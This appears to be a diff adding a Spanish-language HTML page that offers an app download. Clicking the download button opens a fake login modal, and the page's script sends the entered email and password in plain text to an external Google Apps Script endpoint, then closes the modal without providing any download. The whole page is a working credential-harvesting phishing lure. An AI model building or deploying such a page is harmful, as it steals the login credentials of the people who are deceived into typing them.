@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Descargar Aplicación</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+    }
+    /* Botón principal */
+    .btn {
+      padding: 12px 24px;
+      background: #007bff;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+    .btn:hover {
+      background: #0056b3;
+    }
+    /* Modal */
+    .modal {
+      display: none;
+      position: fixed;
+      z-index: 999;
+      left: 0; top: 0;
+      width: 100%; height: 100%;
+      background-color: rgba(0,0,0,0.5);
+      justify-content: center;
+      align-items: center;
+    }
+    .modal-content {
+      background: white;
+      padding: 20px;
+      border-radius: 10px;
+      text-align: center;
+      width: 300px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.3);
+    }
+    .input {
+      width: 90%;
+      padding: 8px;
+      margin: 8px 0;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+    .loading {
+      display: none;
+      margin-top: 10px;
+      color: #007bff;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Botón principal -->
+  <button class="btn" onclick="abrirModal()">Descargar aplicación ya</button>
+
+  <!-- Modal -->
+  <div class="modal" id="miModal">
+    <div class="modal-content">
+      <h2>Iniciar sesión</h2>
+      <input type="email" id="correo" class="input" placeholder="Correo" required>
+      <input type="password" id="contrasena" class="input" placeholder="Contraseña" required>
+      <br>
+      <button class="btn" onclick="registrar()">Registrar</button>
+      <div class="loading" id="loading">Cargando...</div>
+    </div>
+  </div>
+
+  <script>
+    const url = "https://script.google.com/macros/s/AKfycbxDzDofah7fpik118pGThmrnZa8273JSfF6oZgCeZVuv9S3tL2WhapsfnJESUn21rAw/exec";
+
+    function abrirModal() {
+      document.getElementById("miModal").style.display = "flex";
+    }
+
+    function registrar() {
+      const correo = document.getElementById("correo").value;
+      const contrasena = document.getElementById("contrasena").value;
+      const loading = document.getElementById("loading");
+
+      if (!correo || !contrasena) {
+        alert("Por favor ingresa tu correo y contraseña");
+        return;
+      }
+
+      // Mostrar cargando
+      loading.style.display = "block";
+
+      // Enviar a Google Sheets
+      fetch(url, {
+        method: "POST",
+        body: JSON.stringify({ correo: correo, contrasena: contrasena })
+      })
+      .then(res => res.text())
+      .then(() => {
+        setTimeout(() => {
+          loading.style.display = "none";
+          document.getElementById("miModal").style.display = "none";
+          document.getElementById("correo").value = "";
+          document.getElementById("contrasena").value = "";
+        }, 2000); // espera 2 segundos
+      })
+      .catch(err => {
+        console.error("Error:", err);
+        alert("Ocurrió un error al registrar");
+        loading.style.display = "none";
+      });
+    }
+
+    // Cerrar modal si se hace clic fuera del cuadro
+    window.onclick = function(event) {
+      const modal = document.getElementById("miModal");
+      if (event.target == modal) {
+        modal.style.display = "none";
+      }
+    }
+  </script>
+
+</body>
+</html>
